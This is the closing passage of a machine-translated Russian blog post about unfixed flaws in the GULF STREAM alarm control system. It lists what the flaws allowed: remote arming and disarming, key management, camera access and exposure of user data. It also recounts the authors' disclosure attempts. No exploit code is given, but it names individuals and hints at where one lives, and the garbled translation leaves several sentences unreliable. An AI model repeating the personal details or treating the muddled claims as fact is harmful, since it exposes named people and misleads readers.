alarm on any of the 70 thousand objects without getting up from the sofa.  A curtain. </p><br><h1 id="osnovnye-vyvody">  Main conclusions </h1><br><p>  Summarizing our muddled presentation, we note that in the alarm management system developed by GULF STREAM, there are errors that allow at least: </p><br><ul><li>  receive information about users of the system and objects where this alarm is installed </li><li>  remotely control the alarm - enable and disable </li><li>  remotely manage contactless keys, including the possibility of adding their own keys or disconnecting an existing </li><li>  remotely access information from surveillance cameras </li></ul><br><p>  We honestly tried to bring this information to representatives of GOLFSTRIM, as well as to its management, for almost 2 months from the moment we received this information.  <strong>To date, this error is NOT fixed</strong> .  One can only assume who, how and for what purposes could use it ... </p><br><p>  A reasonable question arises - if the founder of the company trusts the protection of his house to GULF STREAM, then can this be an example for imitation of ordinary citizens who want to "have the right to security"? </p><br><p>  <strong>Our answer is NO!</strong> </p><br><p>  It is also interesting that among the objects of GOLFSTRIM protection there are facilities of the Federal Protective Service and UDP located on Rublevo-Uspenskoye Highway, as well as important public utility companies ... </p><br><p>  I wonder whether the director of the FSO, Kochnev DV, will be pleased, having learned that you can get to a number of departmental objects by clicking with the mouse?  But to get him to Mr. Pisman and call for responsibility for negligence, who lives according to the records (he is a patriot of his own system) next to Zhukovka, it is easy and simple - literally hand in hand, and even better to send black craters. </p><br><p>  PS Separately, it is worth noting the communication style of the SB of the Gulf Stream and its employees - the very word in the title that comes to mind after the conversation (there is a record). </p><br><p>  PSS September 27, 2017, morning.  We are glad that we managed to convey this problem to the management of the company, which has existed for about 2 years (the time of the release of the mobile application).  At the moment, the company's server is disabled - a logical line of thought, there is no server - there is no vulnerability (at least this ..) </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/338752/">https://habr.com/ru/post/338752/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../338736/index.html">How to solve the perennial conflict between development and operation?</a></li>
<li><a href="../338740/index.html">The results of the summer internship 2017 in Digital Security. Department of research</a></li>
<li><a href="../338742/index.html">Hackathon from ABBYY</a></li>
<li><a href="../338744/index.html">Reamp library: pain killer for your Android applications</a></li>
<li><a href="../338746/index.html">Hosting for a startup: designer, clouds or your own hardware?</a></li>
<li><a href="../338758/index.html">How Alexey Moiseenkov reached Prisma and went further</a></li>
<li><a href="../338760/index.html">The process of release of iOS-applications in Badoo</a></li>
<li><a href="../338762/index.html">Data geometry 3. Scalar product of pairs</a></li>
<li><a href="../338764/index.html">Making MitM using openssl on Android</a></li>
<li><a href="../338766/index.html">Options in Swift</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>